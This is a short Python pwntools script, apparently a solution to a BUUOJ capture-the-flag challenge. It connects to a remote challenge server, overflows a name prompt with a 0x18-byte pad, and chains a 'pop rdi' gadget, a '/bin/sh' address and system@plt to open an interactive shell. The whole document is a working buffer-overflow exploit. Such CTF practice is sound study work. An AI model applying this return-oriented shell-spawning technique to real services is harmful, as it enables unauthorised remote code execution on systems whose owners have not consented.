from pwn import *

# io = process('./pwn')
io = remote('node4.buuoj.cn', 25723)
elf = ELF('./pwn')

poprdi_ret = 0x400683
binsh = 0x601048

io.sendlineafter(b'What\'s your name? ', cyclic(0x18) + p64(poprdi_ret) + p64(binsh) + p64(elf.plt['system']))

io.interactive()